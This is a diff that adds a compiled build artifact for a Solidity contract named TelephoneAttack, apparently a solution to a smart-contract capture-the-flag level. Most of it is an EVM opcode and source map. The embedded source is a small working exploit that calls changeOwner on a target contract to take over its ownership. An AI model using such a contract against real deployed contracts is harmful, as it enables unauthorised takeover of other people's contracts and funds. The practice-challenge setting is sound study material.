+      "path": "8"
+    },
+    "144": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "MSTORE",
+      "path": "8"
+    },
+    "145": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "147": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "149": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "151": {
+      "op": "SHL"
+    },
+    "152": {
+      "op": "SUB"
+    },
+    "153": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP6",
+      "path": "8"
+    },
+    "154": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP2",
+      "path": "8"
+    },
+    "155": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "AND",
+      "path": "8"
+    },
+    "156": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x4"
+    },
+    "158": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP4",
+      "path": "8"
+    },
+    "159": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "ADD",
+      "path": "8"
+    },
+    "160": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "MSTORE",
+      "path": "8"
+    },
+    "161": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "SWAP2",
+      "path": "8"
+    },
+    "162": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "MLOAD",
+      "path": "8"
+    },
+    "163": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        368
+      ],
+      "op": "SWAP2",
+      "path": "8"
+    },
+    "164": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        368
+      ],
+      "op": "SWAP1",
+      "path": "8"
+    },
+    "165": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        368
+      ],
+      "op": "SWAP3",
+      "path": "8"
+    },
+    "166": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        368
+      ],
+      "op": "AND",
+      "path": "8"
+    },
+    "167": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        368
+      ],
+      "op": "SWAP3",
+      "path": "8"
+    },
+    "168": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        380
+      ],
+      "op": "PUSH4",
+      "path": "8",
+      "value": "0xA6F9DAE1"
+    },
+    "173": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        380
+      ],
+      "op": "SWAP3",
+      "path": "8"
+    },
+    "174": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x24"
+    },
+    "176": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "177": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP3",
+      "path": "8"
+    },
+    "178": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "ADD",
+      "path": "8"
+    },
+    "179": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "SWAP4",
+      "path": "8"
+    },
+    "180": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "SWAP2",
+      "path": "8"
+    },
+    "181": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP3",
+      "path": "8"
+    },
+    "182": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "SWAP1",
+      "path": "8"
+    },
+    "183": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "SUB",
+      "path": "8"
+    },
+    "184": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "ADD",
+      "path": "8"
+    },
+    "185": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP2",
+      "path": "8"
+    },
+    "186": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        368
+      ],
+      "op": "DUP4",
+      "path": "8"
+    },
+    "187": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        368
+      ],
+      "op": "DUP8",
+      "path": "8"
+    },
+    "188": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "189": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "EXTCODESIZE",
+      "path": "8"
+    },
+    "190": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "ISZERO",
+      "path": "8"
+    },
+    "191": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "192": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "ISZERO",
+      "path": "8"
+    },
+    "193": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0xC8"
+    },
+    "195": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "JUMPI",
+      "path": "8"
+    },
+    "196": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x0"
+    },
+    "198": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "199": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "REVERT",
+      "path": "8"
+    },
+    "200": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "201": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "POP",
+      "path": "8"
+    },
+    "202": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "GAS",
+      "path": "8"
+    },
+    "203": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "CALL",
+      "path": "8"
+    },
+    "204": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "ISZERO",
+      "path": "8"
+    },
+    "205": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "206": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "ISZERO",
+      "path": "8"
+    },
+    "207": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0xDB"
+    },
+    "209": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "JUMPI",
+      "path": "8"
+    },
+    "210": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "8"
+    },
+    "211": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x0"
+    },
+    "213": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "214": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "RETURNDATACOPY",
+      "path": "8"
+    },
+    "215": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "8"
+    },
+    "216": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x0"
+    },
+    "218": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "REVERT",
+      "path": "8"
+    },
+    "219": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "220": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "POP",
+      "path": "8"
+    },
+    "221": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "POP",
+      "path": "8"
+    },
+    "222": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "POP",
+      "path": "8"
+    },
+    "223": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "POP",
+      "path": "8"
+    },
+    "224": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "POP",
+      "path": "8"
+    },
+    "225": {
+      "fn": "TelephoneAttack.attack",
+      "jump": "o",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "JUMP",
+      "path": "8"
+    },
+    "226": {
+      "offset": [
+        166,
+        193
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "227": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x0"
+    },
+    "229": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "SLOAD",
+      "path": "8"
+    },
+    "230": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "232": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "234": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "236": {
+      "op": "SHL"
+    },
+    "237": {
+      "op": "SUB"
+    },
+    "238": {
+      "offset": [
+        166,
+        193
+      ],
+      "op": "AND",
+      "path": "8"
+    },
+    "239": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "DUP2",
+      "path": "8"
+    },
+    "240": {
+      "fn": "TelephoneAttack.attack",
+      "jump": "o",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "JUMP",
+      "path": "8"
+    }
+  },
+  "sha1": "a7599ba2d4360abf7eb0f0e5e4ed53b738b20cc2",
+  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ninterface ITelephone {\n    function changeOwner(address __owner) external;\n}\n\ncontract TelephoneAttack {\n    ITelephone public challenge;\n\n    constructor(address _challengeAddress) public {\n        challenge = ITelephone(_challengeAddress);\n    }\n\n    function attack(address _owner) public {\n        challenge.changeOwner(_owner);\n    }\n}",
+  "sourceMap": "135:262:8:-:0;;;200:104;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;200:104:8;256:9;:41;;-1:-1:-1;;;;;256:41:8;;;-1:-1:-1;;;;;;256:41:8;;;;;;;;;135:262;;;;;;",
+  "sourcePath": "contracts/04_Telephone/TelephoneAttack.sol",
+  "type": "contract"
+}
